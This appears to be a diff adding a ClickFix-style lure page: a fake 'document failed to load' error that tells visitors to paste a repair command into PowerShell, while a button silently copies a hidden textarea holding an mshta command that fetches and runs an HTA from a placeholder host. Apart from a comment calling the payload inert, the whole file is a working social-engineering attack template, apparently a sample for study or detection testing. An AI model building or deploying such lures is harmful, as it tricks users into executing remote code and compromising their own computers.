@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<!-- ClickFix variant: hidden textarea + execCommand('copy') on any click, "fix the error" lure. Payload is inert. -->
+<html lang="en"><head><meta charset="utf-8"><title>Document failed to load</title></head>
+<body style="font-family:Arial;margin:40px">
+<h2>This document failed to load</h2>
+<p>To fix the error, open PowerShell and paste (Ctrl+V) the repair command, then press Enter.</p>
+<button id="fix">Copy repair command</button>
+<textarea id="t" style="position:absolute;left:-9999px">mshta https://example.invalid/repair.hta</textarea>
+<script>
+  document.getElementById('fix').addEventListener('click', () => {
+    const t = document.getElementById('t');
+    t.focus(); t.select();
+    document.execCommand('copy');
+  });
+</script></body></html>
